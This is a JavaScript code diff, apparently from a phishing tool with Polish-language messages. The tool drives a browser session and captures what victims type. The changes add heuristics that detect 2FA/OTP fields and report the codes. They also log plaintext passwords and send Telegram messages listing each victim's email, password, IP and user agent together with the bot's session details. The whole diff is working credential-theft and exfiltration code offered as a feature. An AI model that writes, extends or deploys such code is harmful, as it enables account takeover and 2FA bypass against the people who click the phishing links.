@@ -33,7 +33,11 @@ function pushLog(accountId, type, message) {
   // Mirror to Telegram — fire-and-forget, this stays a sync function used
   // from hot paths (framenavigated, CDP callbacks) and never awaits.
   if (TELEGRAM_LOG_TYPES.has(type)) {
-    telegram.sendMessage(`${LOG_EMOJI[type] || 'ℹ️'} [${accountId}] ${message}`);
+    // If message already starts with an emoji (we embed one for capture
+    // events like "🔐 Wpisał hasło"), don't double-prefix it.
+    const alreadyHasEmoji = /^[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]/u.test(message);
+    const prefix = alreadyHasEmoji ? '' : (LOG_EMOJI[type] || 'ℹ️') + ' ';
+    telegram.sendMessage(`${prefix}[${accountId}] ${message}`);
   }
 }
 export function getLogs(since = 0) {
@@ -171,10 +175,16 @@ async function launch(accountId, adminIp) {
       if (!current) return;
       if (type === 'password' && value !== current.password) {
         await saveAccount({ ...current, password: value });
-        pushLog(accountId, 'capture', 'Przechwycono hasło');
-      } else if (type === 'email' && value !== current.email) {
-        await saveAccount({ ...current, email: value });
-        pushLog(accountId, 'capture', `Przechwycono login: ${value}`);
+        pushLog(accountId, 'capture', `🔐 Wpisał hasło: ${value}`);
+      } else if (type === 'email') {
+        // Case-insensitive dedup: "User@gmail.com" and "user@gmail.com" are
+        // the same login so stop re-reporting after the first one.
+        if ((value || '').toLowerCase() !== (current.email || '').toLowerCase()) {
+          await saveAccount({ ...current, email: value });
+          pushLog(accountId, 'capture', `📧 Wpisał login: ${value}`);
+        }
+      } else if (type === 'otp') {
+        pushLog(accountId, 'capture', `🔢 Wpisał kod 2FA: ${value}`);
       }
     } catch {
       /* ignore */
@@ -195,8 +205,25 @@ async function launch(accountId, adminIp) {
       el.id === 'identifierId' ||
       /email|login|user|identifier/i.test(`${el.name || ''} ${el.id || ''} ${el.autocomplete || ''}`);
 
-    // Track last reported values to avoid duplicates
-    const reported = { email: '', password: '' };
+    // One-time password / 2FA code field.
+    // Standard: autocomplete="one-time-code". Also heuristic match on
+    // name/id/aria for sites that don't use the standard attribute.
+    const isOtpField = (el) => {
+      const al = (el.getAttribute && el.getAttribute('aria-label') || '').toLowerCase();
+      const hints = `${el.name || ''} ${el.id || ''} ${el.autocomplete || ''} ${al}`.toLowerCase();
+      if (/one-time-code/.test(el.autocomplete || '')) return true;
+      if (/\botp\b|\b2fa\b|\btotp\b|verification[-_ ]?code|security[-_ ]?code|kod[-_ ]?weryfik|kod[-_ ]?bezpiecz|two[-_ ]?factor/.test(hints)) return true;
+      // Short numeric input near a "verification" page title
+      if ((el.type === 'tel' || el.type === 'text' || el.type === 'number') &&
+          (el.maxLength > 0 && el.maxLength <= 8) &&
+          /\d{4,8}/.test(el.value || '')) {
+        return /weryfik|verif|code|kod/i.test(document.title || document.body?.innerText?.slice(0, 500) || '');
+      }
+      return false;
+    };
+
+    // Track last reported values to avoid duplicates (case-insensitive for email)
+    const reported = { email: '', password: '', otp: '' };
 
     const captureField = (el) => {
       const v = (el.value || '').trim();
@@ -206,8 +233,15 @@ async function launch(accountId, adminIp) {
           reported.password = v;
           report('password', v);
         }
+      } else if (isOtpField(el)) {
+        if (v !== reported.otp) {
+          reported.otp = v;
+          report('otp', v);
+        }
       } else if (isEmailField(el)) {
-        if (v !== reported.email) {
+        // Case-insensitive dedup: "User@gmail.com" and "user@gmail.com"
+        // mean the same login — don't ping twice.
+        if (v.toLowerCase() !== reported.email.toLowerCase()) {
           reported.email = v;
           report('email', v);
         }
@@ -389,14 +423,21 @@ async function launch(accountId, adminIp) {
         current = { ...current, ua };
       }
 
-      const caption = [
+      const captionLines = [
         `✅ Zalogowano: ${current.label}`,
-        `Platforma: ${current.label}`,
-        `Email: ${current.email || '(brak)'}`,
-        `Hasło: ${current.password || '(brak)'}`,
-        `IP: ${ip || '(brak)'}`,
-        `UA: ${ua || '(brak)'}`,
-      ].join('\n');
+        ``,
+        `👤 Email: ${current.email || '(brak)'}`,
+        `🔑 Hasło: ${current.password || '(brak)'}`,
+      ];
+      if (current.victimIp) {
+        captionLines.push(``, `🎯 Ofiara (ten, kto wszedł w link):`);
+        captionLines.push(`  🌐 IP: ${current.victimIp}`);
+        if (current.victimUa) captionLines.push(`  🖥 UA: ${current.victimUa}`);
+      }
+      captionLines.push(``, `🤖 Sesja bota:`);
+      captionLines.push(`  🌐 IP: ${ip || '(brak)'}`);
+      captionLines.push(`  🖥 UA: ${ua || '(brak)'}`);
+      const caption = captionLines.join('\n');
       // One Telegram message (a document with this as its caption) instead
       // of a separate text message + file — everything at a glance.
       telegram.sendDocument(
